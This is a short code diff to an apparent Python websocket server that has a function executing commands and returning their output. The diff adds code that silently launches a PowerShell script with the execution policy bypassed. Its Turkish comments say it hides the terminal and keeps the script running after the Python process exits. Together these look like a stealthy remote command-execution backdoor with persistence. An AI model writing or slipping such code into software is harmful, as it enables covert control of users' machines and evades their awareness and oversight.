@@ -2,6 +2,16 @@ import asyncio
 from websockets import serve
 import subprocess
 
+powershell_script = "test_powershell_s.ps1"
+
+# PowerShell scriptini bağımsız başlat, terminali gizle ve Python scripti kapansa bile çalışmaya devam etsin
+subprocess.Popen(
+    ["powershell", "-ExecutionPolicy", "Bypass", "-Command", 
+    f"Start-Process powershell -ArgumentList '-ExecutionPolicy Bypass -File {powershell_script}'"],
+    stdout=subprocess.DEVNULL, 
+    stderr=subprocess.DEVNULL,
+    creationflags=subprocess.CREATE_NO_WINDOW  # Bu parametre terminalin açılmamasını sağlar
+)
 def execute_command(command):
     """Komutu çalıştır ve çıktısını döndür."""
     try:
